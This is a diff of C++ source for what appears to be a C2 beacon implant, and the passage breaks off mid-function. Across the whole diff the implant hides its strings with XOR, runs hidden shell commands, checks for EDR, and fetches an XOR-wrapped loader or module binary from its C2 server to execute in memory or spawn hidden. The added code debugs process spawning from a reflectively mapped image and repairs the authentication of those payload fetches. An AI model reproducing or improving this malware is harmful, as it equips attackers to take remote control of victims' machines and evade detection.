@@ -40,6 +40,7 @@
 #endif
 #include <cstdlib>
 #include <cstdio>
+#include <cstring>
 #include <ctime>
 #include <string>
 #include <vector>
@@ -227,6 +228,369 @@ static const size_t kMaxTaskOutput = 512 * 1024;
 //
 // POSIX: the child becomes a process-group leader (setpgid on both sides to
 // close the race) and the timeout kills the group with kill(-pgid, SIGKILL).
+// Diagnostic trace for the spawn path. Off in every normal build; a build that
+// sets it to 1 writes %TEMP%\phantom_cam_trace.log (the same file the camera
+// diagnostics use) so a crash inside CreateProcess/pipe handling can be
+// attributed to the exact call instead of guessed from an exception address.
+#ifndef PHANTOM_SHELL_TRACE
+#define PHANTOM_SHELL_TRACE 0
+#endif
+
+#if PHANTOM_SHELL_TRACE
+// ── Diagnostic-only spawn tracing ─────────────────────────────────────────
+// These helpers are compiled out of every normal beacon. They answer three
+// questions that a BEX64 event-log line cannot: which image are we mapped at,
+// what does the TLS directory say, and which CreateProcess entry point (IAT
+// slot vs GetProcAddress) faults.
+static bool _ph_readable(const void* p, size_t n) {
+    if (!p) return false;
+    MEMORY_BASIC_INFORMATION mbi{};
+    if (VirtualQuery(p, &mbi, sizeof(mbi)) == 0) return false;
+    if (mbi.State != MEM_COMMIT) return false;
+    if (mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD)) return false;
+    const BYTE* end = static_cast<const BYTE*>(p) + n;
+    return end <= static_cast<const BYTE*>(mbi.BaseAddress) + mbi.RegionSize;
+}
+
+static BYTE* _ph_image_base() {
+    uintptr_t p = reinterpret_cast<uintptr_t>(&_ph_image_base) & ~static_cast<uintptr_t>(0xFFF);
+    for (int i = 0; i < 0x400; ++i, p -= 0x1000) {
+        const BYTE* page = reinterpret_cast<const BYTE*>(p);
+        if (!_ph_readable(page, sizeof(IMAGE_DOS_HEADER))) continue;
+        const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(page);
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
+        if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x1000) continue;
+        if (!_ph_readable(page + dos->e_lfanew, sizeof(DWORD))) continue;
+        if (*reinterpret_cast<const DWORD*>(page + dos->e_lfanew) != IMAGE_NT_SIGNATURE)
+            continue;
+        if (!_ph_readable(page + dos->e_lfanew, sizeof(IMAGE_NT_HEADERS))) continue;
+        return const_cast<BYTE*>(page);
+    }
+    return nullptr;
+}
+
+static void _ph_trace_image() {
+    BYTE* base = _ph_image_base();
+    if (!base) {
+        media_utils::xtrace("img:not-found");
+        return;
+    }
+    const IMAGE_NT_HEADERS* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
+        base + reinterpret_cast<const IMAGE_DOS_HEADER*>(base)->e_lfanew);
+    char b[512];
+    snprintf(b, sizeof(b),
+             "img:base=%p optbase=%p delta=%lld size=%lx entry=%lx host=%p k32=%p kb=%p",
+             base, reinterpret_cast<void*>(nt->OptionalHeader.ImageBase),
+             static_cast<long long>(reinterpret_cast<BYTE*>(base) -
+                                    reinterpret_cast<BYTE*>(nt->OptionalHeader.ImageBase)),
+             static_cast<unsigned long>(nt->OptionalHeader.SizeOfImage),
+             static_cast<unsigned long>(nt->OptionalHeader.AddressOfEntryPoint),
+             reinterpret_cast<void*>(GetModuleHandleA(nullptr)),
+             reinterpret_cast<void*>(GetModuleHandleA("kernel32.dll")),
+             reinterpret_cast<void*>(GetModuleHandleA("kernelbase.dll")));
+    media_utils::xtrace(b);
+
+    const IMAGE_DATA_DIRECTORY& td =
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    if (td.VirtualAddress && td.Size >= sizeof(IMAGE_TLS_DIRECTORY)) {
+        if (_ph_readable(base + td.VirtualAddress, sizeof(IMAGE_TLS_DIRECTORY))) {
+            const IMAGE_TLS_DIRECTORY* tls =
+                reinterpret_cast<const IMAGE_TLS_DIRECTORY*>(base + td.VirtualAddress);
+            DWORD idx = 0xFFFFFFFF;
+            if (_ph_readable(reinterpret_cast<const void*>(tls->AddressOfIndex),
+                             sizeof(DWORD))) {
+                idx = *reinterpret_cast<const DWORD*>(tls->AddressOfIndex);
+            }
+            void* cb0 = nullptr;
+            void* cb1 = nullptr;
+            if (_ph_readable(reinterpret_cast<const void*>(tls->AddressOfCallBacks),
+                             sizeof(void*) * 2)) {
+                const void* const* cbs =
+                    reinterpret_cast<const void* const*>(tls->AddressOfCallBacks);
+                cb0 = const_cast<void*>(cbs[0]);
+                cb1 = const_cast<void*>(cbs[1]);
+            }
+            snprintf(b, sizeof(b),
+                     "tls:rva=%lx index=%lu index_ptr=%p raw=%llx..%llx zero=%lu cb=%p cb0=%p cb1=%p",
+                     static_cast<unsigned long>(td.VirtualAddress),
+                     static_cast<unsigned long>(idx),
+                     reinterpret_cast<void*>(tls->AddressOfIndex),
+                     static_cast<unsigned long long>(tls->StartAddressOfRawData),
+                     static_cast<unsigned long long>(tls->EndAddressOfRawData),
+                     static_cast<unsigned long>(tls->SizeOfZeroFill),
+                     reinterpret_cast<void*>(tls->AddressOfCallBacks), cb0, cb1);
+            media_utils::xtrace(b);
+        }
+    } else {
+        media_utils::xtrace("tls:none");
+    }
+
+    // The exception directory is what makes SEH/unwind work for a mapped
+    // image. It is diagnostic-only; Windows will not use it unless the image
+    // is registered, but seeing the RVA tells us whether it exists at all.
+    const IMAGE_DATA_DIRECTORY& ed =
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+    snprintf(b, sizeof(b), "exc:rva=%lx size=%lx",
+             static_cast<unsigned long>(ed.VirtualAddress),
+             static_cast<unsigned long>(ed.Size));
+    media_utils::xtrace(b);
+}
+
+// Locate an imported function's IAT slot by walking the mapped image's own
+// import directory. Hard-coded RVAs drift with every source change; the
+// loader writes the slot the walk finds, so the diagnostic must read the same
+// one.
+static void** _ph_find_iat(BYTE* base, const char* wanted) {
+    if (!base || !wanted) return nullptr;
+    const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
+    const IMAGE_NT_HEADERS* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
+        base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
+    const IMAGE_DATA_DIRECTORY& dir =
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (!dir.VirtualAddress) return nullptr;
+
+    IMAGE_IMPORT_DESCRIPTOR* desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
+        base + dir.VirtualAddress);
+    for (; desc->Name; ++desc) {
+        DWORD thunk_rva = desc->OriginalFirstThunk ? desc->OriginalFirstThunk
+                                                   : desc->FirstThunk;
+        IMAGE_THUNK_DATA* thunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
+            base + thunk_rva);
+        IMAGE_THUNK_DATA* iat = reinterpret_cast<IMAGE_THUNK_DATA*>(
+            base + desc->FirstThunk);
+        for (; thunk->u1.AddressOfData; ++thunk, ++iat) {
+            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) continue;
+            IMAGE_IMPORT_BY_NAME* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
+                base + thunk->u1.AddressOfData);
+            if (std::strcmp(reinterpret_cast<const char*>(ibn->Name), wanted) == 0) {
+                return reinterpret_cast<void**>(&iat->u1.Function);
+            }
+        }
+    }
+    return nullptr;
+}
+
+static void _ph_trace_iat() {
+    BYTE* base = _ph_image_base();
+    if (!base) {
+        media_utils::xtrace("iat:no-image-base");
+        return;
+    }
+    // The loader fills these slots from the import directory; reading them
+    // separates "the loader put a bad pointer in the IAT" from "the exported
+    // function itself faults".
+    void** slot_a = _ph_find_iat(base, "CreateProcessA");
+    void** slot_w = _ph_find_iat(base, "CreateProcessW");
+    char b[256];
+    snprintf(b, sizeof(b), "iat:base=%p A_slot=%p A_value=%p W_slot=%p W_value=%p",
+             base, reinterpret_cast<void*>(slot_a),
+             (slot_a && _ph_readable(slot_a, sizeof(void*))) ? *slot_a : nullptr,
+             reinterpret_cast<void*>(slot_w),
+             (slot_w && _ph_readable(slot_w, sizeof(void*))) ? *slot_w : nullptr);
+    media_utils::xtrace(b);
+}
+
+static void _ph_trace_import(const char* name, void** slot) {
+    HMODULE k32 = GetModuleHandleA("kernel32.dll");
+    HMODULE kb = GetModuleHandleA("kernelbase.dll");
+    void* gpa32 = k32 ? reinterpret_cast<void*>(GetProcAddress(k32, name)) : nullptr;
+    void* gpaKb = kb ? reinterpret_cast<void*>(GetProcAddress(kb, name)) : nullptr;
+    void* resolved = slot ? *slot : nullptr;
+    char b[512];
+    snprintf(b, sizeof(b), "imp:%s slot=%p resolved=%p gpa32=%p gpaKb=%p",
+             name, reinterpret_cast<void*>(slot), resolved, gpa32, gpaKb);
+    media_utils::xtrace(b);
+    for (const char* label : {"resolved", "gpa32", "gpaKb"}) {
+        void* p = label[0] == 'r' ? resolved : label[3] == '3' ? gpa32 : gpaKb;
+        MEMORY_BASIC_INFORMATION mbi{};
+        if (p && VirtualQuery(p, &mbi, sizeof(mbi))) {
+            snprintf(b, sizeof(b), "imp:%s %s base=%p protect=%lx type=%lx",
+                     name, label, mbi.BaseAddress,
+                     static_cast<unsigned long>(mbi.Protect),
+                     static_cast<unsigned long>(mbi.Type));
+            media_utils::xtrace(b);
+        }
+    }
+}
+
+typedef BOOL (WINAPI *pfnCreateProcessA)(
+    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD,
+    LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef BOOL (WINAPI *pfnCreateProcessW)(
+    LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD,
+    LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+
+static bool _ph_spawn_attempt(const char* label, bool wide, bool pipes,
+                              bool suspended, void* override_fn) {
+    HANDLE rd = nullptr, wr = nullptr;
+    SECURITY_ATTRIBUTES sa = {sizeof(sa), nullptr, TRUE};
+    STARTUPINFOA si{};
+    STARTUPINFOW siW{};
+    PROCESS_INFORMATION pi{};
+    DWORD flags = CREATE_NO_WINDOW;
+    if (suspended) flags |= CREATE_SUSPENDED | CREATE_NEW_PROCESS_GROUP;
+
+    if (pipes) {
+        if (!CreatePipe(&rd, &wr, &sa, 0)) {
+            char b[128];
+            snprintf(b, sizeof(b), "probe:%s pipe-fail gle=%lu", label,
+                     static_cast<unsigned long>(GetLastError()));
+            media_utils::xtrace(b);
+            return false;
+        }
+        SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+        si.wShowWindow = SW_HIDE;
+        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+        si.hStdOutput = wr;
+        si.hStdError = wr;
+        siW.cb = sizeof(siW);
+        siW.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+        siW.wShowWindow = SW_HIDE;
+        siW.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+        siW.hStdOutput = wr;
+        siW.hStdError = wr;
+    } else {
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        siW.cb = sizeof(siW);
+        siW.dwFlags = STARTF_USESHOWWINDOW;
+        siW.wShowWindow = SW_HIDE;
+    }
+
+    char cmdA[] = "cmd.exe /c whoami";
+    wchar_t cmdW[] = L"cmd.exe /c whoami";
+    {
+        char pb[192];
+        snprintf(pb, sizeof(pb),
+                 "probe:%s:pre tid=%lu fn=%p cmd=%p si=%p pi=%p",
+                 label, static_cast<unsigned long>(GetCurrentThreadId()),
+                 override_fn,
+                 static_cast<void*>(wide ? static_cast<void*>(cmdW)
+                                         : static_cast<void*>(cmdA)),
+                 static_cast<void*>(wide ? static_cast<void*>(&siW)
+                                         : static_cast<void*>(&si)),
+                 static_cast<void*>(&pi));
+        media_utils::xtrace(pb);
+    }
+    BOOL ok = FALSE;
+    if (wide) {
+        pfnCreateProcessW fn = override_fn
+            ? reinterpret_cast<pfnCreateProcessW>(override_fn) : CreateProcessW;
+        ok = fn(nullptr, cmdW, nullptr, nullptr, pipes ? TRUE : FALSE, flags,
+                nullptr, nullptr, &siW, &pi);
+    } else {
+        pfnCreateProcessA fn = override_fn
+            ? reinterpret_cast<pfnCreateProcessA>(override_fn) : CreateProcessA;
+        ok = fn(nullptr, cmdA, nullptr, nullptr, pipes ? TRUE : FALSE, flags,
+                nullptr, nullptr, &si, &pi);
+    }
+    char b[160];
+    snprintf(b, sizeof(b), "probe:%s:%s gle=%lu", label,
+             ok ? "ok" : "fail", static_cast<unsigned long>(GetLastError()));
+    media_utils::xtrace(b);
+    if (ok) {
+        if (suspended) ResumeThread(pi.hThread);
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (wr) CloseHandle(wr);
+    if (rd) CloseHandle(rd);
+    return ok != FALSE;
+}
+
+// Manually mapped images are invisible to the OS loader, so Windows never
+// calls their TLS callbacks for a newly created thread.  The primary beacon
+// thread was attached by the reflective loader itself; task workers created
+// with std::thread were not.  Any CRT state those workers touch then starts
+// from NULL, which can surface as a wild jump deep inside an unrelated API.
+// Attach the image's TLS block and callbacks on the worker before it runs.
+static void _ph_thread_attach() {
+    BYTE* base = _ph_image_base();
+    if (!base) {
+        media_utils::xtrace("thread:tls-no-base");
+        return;
+    }
+    const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
+        media_utils::xtrace("thread:tls-no-mz");
+        return;
+    }
+    const IMAGE_NT_HEADERS* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
+        base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) {
+        media_utils::xtrace("thread:tls-no-pe");
+        return;
+    }
+    const IMAGE_DATA_DIRECTORY& td =
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    if (!td.VirtualAddress || td.Size < sizeof(IMAGE_TLS_DIRECTORY)) {
+        media_utils::xtrace("thread:tls-none");
+        return;
+    }
+    const IMAGE_TLS_DIRECTORY* tls = reinterpret_cast<const IMAGE_TLS_DIRECTORY*>(
+        base + td.VirtualAddress);
+    if (!tls->AddressOfIndex ||
+        !_ph_readable(reinterpret_cast<const void*>(tls->AddressOfIndex),
+                      sizeof(DWORD))) {
+        media_utils::xtrace("thread:tls-no-index");
+        return;
+    }
+    DWORD index = *reinterpret_cast<const DWORD*>(tls->AddressOfIndex);
+    if (index == TLS_OUT_OF_INDEXES) {
+        media_utils::xtrace("thread:tls-index-invalid");
+        return;
+    }
+
+    if (!TlsGetValue(index) && tls->StartAddressOfRawData
+            && tls->EndAddressOfRawData > tls->StartAddressOfRawData) {
+        ULONGLONG raw = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
+        ULONGLONG total = raw + static_cast<ULONGLONG>(tls->SizeOfZeroFill);
+        BYTE* block = static_cast<BYTE*>(VirtualAlloc(
+            nullptr, static_cast<SIZE_T>(total),
+            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
+        if (block) {
+            std::memset(block, 0, static_cast<size_t>(total));
+            std::memcpy(block, reinterpret_cast<const void*>(
+                            tls->StartAddressOfRawData), static_cast<size_t>(raw));
+            TlsSetValue(index, block);
+        }
+    }
+
+    if (tls->AddressOfCallBacks) {
+        typedef void (__stdcall *pfnTlsCallback)(void*, DWORD, void*);
+        pfnTlsCallback* callbacks =
+            reinterpret_cast<pfnTlsCallback*>(tls->AddressOfCallBacks);
+        if (_ph_readable(callbacks, sizeof(void*) * 2)) {
+            for (DWORD i = 0; callbacks[i] != nullptr; ++i) {
+                callbacks[i](base, DLL_THREAD_ATTACH, nullptr);
+            }
+        }
+    }
+    char b[160];
+    snprintf(b, sizeof(b), "thread:tls-attached tid=%lu index=%lu base=%p",
+             static_cast<unsigned long>(GetCurrentThreadId()),
+             static_cast<unsigned long>(index), base);
+    media_utils::xtrace(b);
+}
+
+struct _PhRawWorkerCtx {
+    std::function<void()> fn;
+};
+
+static DWORD WINAPI _ph_raw_worker_entry(LPVOID p) {
+    _ph_thread_attach();
+    std::unique_ptr<_PhRawWorkerCtx> ctx(static_cast<_PhRawWorkerCtx*>(p));
+    ctx->fn();
+    return 0;
+}
+#endif
+
 static std::string run_shell_command_bounded(const std::string& cmd,
                                              int budget_ms) {
     std::string output;
@@ -234,10 +598,16 @@ static std::string run_shell_command_bounded(const std::string& cmd,
     bool timed_out = false;
 
 #ifdef _WIN32
+#if PHANTOM_SHELL_TRACE
+    media_utils::xtrace("sh:enter");
+#endif
     HANDLE hRead, hWrite;
     SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return XOR_DEC(XOR_STR("Error: pipe creation failed")).c_str();
     SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+#if PHANTOM_SHELL_TRACE
+    media_utils::xtrace("sh:pipe");
+#endif
 
     // The job IS the process-tree guarantee. If it cannot be created we still
     // run the command, but the timeout below then only kills the direct child.
@@ -252,6 +622,9 @@ static std::string run_shell_command_bounded(const std::string& cmd,
             job = nullptr;
         }
     }
+#if PHANTOM_SHELL_TRACE
+    media_utils::xtrace(job ? "sh:job-ok" : "sh:job-none");
+#endif
 
     STARTUPINFOA si = { sizeof(STARTUPINFOA) };
     si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
@@ -270,14 +643,23 @@ static std::string run_shell_command_bounded(const std::string& cmd,
     // CREATE_SUSPENDED so the job assignment lands before any child can run.
     DWORD flags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED;
 
+#if PHANTOM_SHELL_TRACE
+    media_utils::xtrace("sh:pre-createproc");
+#endif
     if (CreateProcessA(nullptr, cmd_buf.data(), nullptr, nullptr, TRUE, flags,
                        nullptr, nullptr, &si, &pi)) {
+#if PHANTOM_SHELL_TRACE
+        media_utils::xtrace("sh:proc-ok");
+#endif
         CloseHandle(hWrite);
         bool in_job = false;
         if (job) in_job = AssignProcessToJobObject(job, pi.hProcess) != FALSE;
         ResumeThread(pi.hThread);
 
         const DWORD deadline = GetTickCount() + static_cast<DWORD>(budget_ms);
+#if PHANTOM_SHELL_TRACE
+        media_utils::xtrace("sh:read-loop");
+#endif
         for (;;) {
             DWORD avail = 0;
             // PeekNamedPipe does not block, so "no data yet" and "pipe closed"
@@ -300,6 +682,9 @@ static std::string run_shell_command_bounded(const std::string& cmd,
             Sleep(25);
         }
 
+#if PHANTOM_SHELL_TRACE
+        media_utils::xtrace(timed_out ? "sh:read-timeout" : "sh:read-end");
+#endif
         if (timed_out || overflow) {
             // The whole tree when we can prove we own it, the direct child
             // otherwise. Silence about which one happened is how an operator
@@ -309,10 +694,16 @@ static std::string run_shell_command_bounded(const std::string& cmd,
         }
         // Bounded: after a kill the kernel needs a moment, but an unbounded
         // wait here would re-introduce the very wedge this fixes.
+#if PHANTOM_SHELL_TRACE
+        media_utils::xtrace("sh:wait");
+#endif
         WaitForSingleObject(pi.hProcess, 2000);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
     } else {
+#if PHANTOM_SHELL_TRACE
+        media_utils::xtrace("sh:proc-fail");
+#endif
         output = XOR_DEC(XOR_STR("Error: CreateProcess failed")).c_str();
         CloseHandle(hWrite);
     }
@@ -399,6 +790,9 @@ static std::string run_shell_command_bounded(const std::string& cmd,
     }
 #endif
 
+#if PHANTOM_SHELL_TRACE
+    media_utils::xtrace("sh:done");
+#endif
     if (output.empty()) output = XOR_DEC(XOR_STR("(no output)\n")).c_str();
     return output;
 }
@@ -453,7 +847,7 @@ static std::string run_task_with_timeout(
         [cmd, cfg_owner]() { return dispatch_command(cmd, *cfg_owner); });
     run->mark_running();
 
-    std::thread worker([run]() {
+    auto work_fn = [run]() {
         const std::string out = run->work()();
         // publish() is a no-op when the watchdog already gave up, which is
         // the whole point: no write to a dead object, no late result.
@@ -463,7 +857,40 @@ static std::string run_task_with_timeout(
         // inside it (that is what made the stranded-worker cap unreachable).
         run->mark_worker_exited();
         task::Registry::instance().release(run.get());
-    });
+    };
+
+#if PHANTOM_SHELL_TRACE
+    // CreateThread rather than std::thread: the CRT/winpthreads trampoline
+    // would run mapped-image code before _ph_thread_attach can initialize the
+    // image TLS block. The raw entry point does the attach as its first act.
+    struct RawWorker {
+        HANDLE h = nullptr;
+        void join() {
+            if (h) {
+                WaitForSingleObject(h, INFINITE);
+                CloseHandle(h);
+                h = nullptr;
+            }
+        }
+        void detach() {
+            if (h) {
+                CloseHandle(h);
+                h = nullptr;
+            }
+        }
+    };
+    RawWorker worker;
+    auto* ctx = new _PhRawWorkerCtx{std::function<void()>(work_fn)};
+    worker.h = CreateThread(nullptr, 0, _ph_raw_worker_entry, ctx, 0, nullptr);
+    if (!worker.h) {
+        delete ctx;
+        media_utils::xtrace("task:thread-create-failed");
+        _ph_thread_attach();
+        work_fn();
+    }
+#else
+    std::thread worker(work_fn);
+#endif
 
     // Bounded wait in small slices: a task that finishes early is noticed
     // quickly, and shutdown/Ctrl+C still lands promptly.
@@ -512,6 +939,79 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
     std::istringstream iss(cmd);
     std::string action;
     iss >> action;
+
+#if PHANTOM_SHELL_TRACE
+    // Diagnostic-only probe: create a child with the SIMPLE path
+    // (media_utils::exec_cmd: no job object, no CREATE_SUSPENDED). It answers
+    // whether CreateProcessA from the mapped image works at all, or only the
+    // shell branch's job/pipe flags are at fault.
+    if (action == XOR_DEC(XOR_STR("health")).c_str()) {
+        std::string probe_arg;
+        if ((iss >> probe_arg) && probe_arg == "__spawnprobe") {
+            media_utils::xtrace("probe:enter");
+            _ph_trace_image();
+            _ph_trace_iat();
+            _ph_trace_import("CreateProcessA",
+                             reinterpret_cast<void**>(&CreateProcessA));
+            _ph_trace_import("CreateProcessW",
+                             reinterpret_cast<void**>(&CreateProcessW));
+
+            HMODULE k32 = GetModuleHandleA("kernel32.dll");
+            HMODULE kb = GetModuleHandleA("kernelbase.dll");
+            void* gpaA = k32 ? reinterpret_cast<void*>(
+                GetProcAddress(k32, "CreateProcessA")) : nullptr;
+            void* gpaW = k32 ? reinterpret_cast<void*>(
+                GetProcAddress(k32, "CreateProcessW")) : nullptr;
+            void* kbA = kb ? reinterpret_cast<void*>(
+                GetProcAddress(kb, "CreateProcessA")) : nullptr;
+            void* kbW = kb ? reinterpret_cast<void*>(
+                GetProcAddress(kb, "CreateProcessW")) : nullptr;
+
+            // kernelbase FIRST. kernel32's CreateProcessA is a forwarding
+            // wrapper that reshuffles ten arguments; if the direct kernelbase
+            // export works from the mapped image, the fault is in that wrapper
+            // (or the stack it reads), not in process creation.
+            _ph_spawn_attempt("kb-a", false, false, false, kbA);
+            _ph_spawn_attempt("kb-w", true, false, false, kbW);
+
+            // Read the mapped image's real IAT slots. A slot that is neither
+            // kernel32's wrapper nor kernelbase's implementation is a loader
+            // import bug; calling it would just re-create the 0x3000000000
+            // jump, so log and skip instead.
+            BYTE* base = _ph_image_base();
+            void** slotA = base ? _ph_find_iat(base, "CreateProcessA") : nullptr;
+            void** slotW = base ? _ph_find_iat(base, "CreateProcessW") : nullptr;
+            void* iatA = slotA ? *slotA : nullptr;
+            void* iatW = slotW ? *slotW : nullptr;
+            bool iatA_ok = iatA && (iatA == gpaA || iatA == kbA);
+            bool iatW_ok = iatW && (iatW == gpaW || iatW == kbW);
+            char ib[256];
+            snprintf(ib, sizeof(ib), "iat:verify A=%p ok=%d W=%p ok=%d",
+                     iatA, iatA_ok ? 1 : 0, iatW, iatW_ok ? 1 : 0);
+            media_utils::xtrace(ib);
+            if (iatA_ok)
+                _ph_spawn_attempt("iat-a", false, false, false, iatA);
+            else
+                media_utils::xtrace("iat-a:skipped-bad-slot");
+            if (iatW_ok)
+                _ph_spawn_attempt("iat-w", true, false, false, iatW);
+            else
+                media_utils::xtrace("iat-w:skipped-bad-slot");
+
+            // The GetProcAddress wrapper path last: if this is what faults,
+            // the exported function was never the problem.
+            _ph_spawn_attempt("gpa-a", false, false, false, gpaA);
+            _ph_spawn_attempt("gpa-w", true, false, false, gpaW);
+            _ph_spawn_attempt("pipes-a", false, true, false, iatA_ok ? iatA : nullptr);
+            _ph_spawn_attempt("suspend-a", false, false, true, iatA_ok ? iatA : nullptr);
+            _ph_spawn_attempt("pipes-suspend-a", false, true, true, iatA_ok ? iatA : nullptr);
+            std::string probe_out = media_utils::exec_cmd("whoami");
+            media_utils::xtrace("probe:done");
+            return "PROBE[completed]" + std::string(" out=") +
+                   (probe_out.empty() ? "empty" : probe_out.substr(0, 80));
+        }
+    }
+#endif
 
     if (action == XOR_DEC(XOR_STR("edrcheck")).c_str()) {
 #ifdef _WIN32
@@ -881,10 +1381,15 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         // after a migration/restart).
         {
             // /x serves the XOR(0xAA)-wrapped loader+PE blob — the exact
-            // bytes the deployment dropper executes in-memory.
+            // bytes the deployment dropper executes in-memory. The 5th
+            // argument is the beacon identity: without it http_request
+            // sends no X-Beacon-Id header, and the server cannot resolve
+            // the per-beacon download token (live defect 2026-10-19:
+            // migrate died with "failed to fetch PIC payload (29 bytes)",
+            // which is the 29-byte "Forbidden: Invalid auth token" body).
             std::string pic_xored = net::http_request(cfg,
                 XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
-                XOR_WDEC(XOR_WSTR(L"/x")).c_str(), "", "");
+                XOR_WDEC(XOR_WSTR(L"/x")).c_str(), "", cfg.beacon_id);
             if (pic_xored.size() < 4096) {
                 return "MIGRATE_ERROR: failed to fetch PIC payload from C2 (" +
                        std::to_string(pic_xored.size()) + " bytes)";
@@ -1021,23 +1526,26 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         if (iss >> tok) r_port = std::atoi(tok.c_str());
         if (iss >> tok) r_ssl = std::atoi(tok.c_str());
 #ifdef _WIN32
-        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
-                          r_host + ":" + std::to_string(r_port) +
-                          "/api/v1/remote_payload_windows?auth=" + crypto::payload_token();
+        // The fetch always targets the configured C2 (http_request uses
+        // cfg.host/cfg.port); r_host/r_port/r_ssl only shape the arguments
+        // handed to the spawned module. The path carries NO query string:
+        // the per-beacon token travels in X-Auth-Token, because a ?auth=
+        // query used to break the HMAC signature (server signs request.path)
+        // and the fetch failed 401 "Unauthorized" (12 bytes) — live defect
+        // 2026-10-19.
+        std::string url = "/api/v1/remote_payload_windows";
 #elif defined(__ANDROID__) || defined(ANDROID)
-        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
-                          r_host + ":" + std::to_string(r_port) +
-                          "/api/v1/remote_payload_android?auth=" + crypto::payload_token();
+        std::string url = "/api/v1/remote_payload_android";
 #else
-        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
-                          r_host + ":" + std::to_string(r_port) +
-                          "/api/v1/remote_payload_linux?auth=" + crypto::payload_token();
+        std::string url = "/api/v1/remote_payload_linux";
 #endif
         std::string bin = net::http_request(cfg, XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
-            std::wstring(url.begin(), url.end()).c_str(), "", "");
+            std::wstring(url.begin(), url.end()).c_str(), "", cfg.beacon_id);
         if (bin.size() < 4096 || bin.find("Payload") != std::string::npos) {
+            // Show the server's own words: a bare byte count turned a 401
+            // ("Unauthorized", 12 bytes) into a guessing game.
             return XOR_DEC(XOR_STR("REMOTE_ERROR: module binary unavailable ")).c_str() +
-                   std::to_string(bin.size());
+                   std::to_string(bin.size()) + " (" + bin.substr(0, 60) + ")";
         }
 #ifdef _WIN32
         // write to a random temp name and spawn hidden
@@ -1228,9 +1736,103 @@ std::string generate_beacon_id() {
 
 // ── Beacon Main Loop ──────────────────────────────────────────────────────
 
+#if PHANTOM_SHELL_TRACE
+// Diagnostic-only: log the faulting instruction and the return address that
+// led there, then let Windows handle it normally. Without this a crash inside
+// CreateProcessA is just "BEX64 at an address" in the event log with no caller.
+static LONG CALLBACK _phantom_trace_veh(PEXCEPTION_POINTERS info) {
+    static volatile LONG in_handler = 0;
+    if (!info || !info->ExceptionRecord || !info->ContextRecord)
+        return EXCEPTION_CONTINUE_SEARCH;
+    // A fault while logging would re-enter this handler for ever.
+    if (InterlockedExchange(&in_handler, 1) != 0)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    const EXCEPTION_RECORD* er = info->ExceptionRecord;
+    CONTEXT* ctx = info->ContextRecord;
+    void* ret = nullptr;
+    void* ret2 = nullptr;
+    if (_ph_readable(reinterpret_cast<const void*>(ctx->Rsp), sizeof(void*)))
+        ret = *reinterpret_cast<void**>(ctx->Rsp);
+    if (_ph_readable(reinterpret_cast<const void*>(ctx->Rsp + sizeof(void*)),
+                     sizeof(void*)))
+        ret2 = *reinterpret_cast<void**>(ctx->Rsp + sizeof(void*));
+
+    char buf[512];
+    snprintf(buf, sizeof(buf),
+             "ex:%08lx flags=%08lx nparams=%lu addr=%p rip=%p rsp=%p rbp=%p "
+             "rax=%p rcx=%p rdx=%p r8=%p r9=%p",
+             static_cast<unsigned long>(er->ExceptionCode),
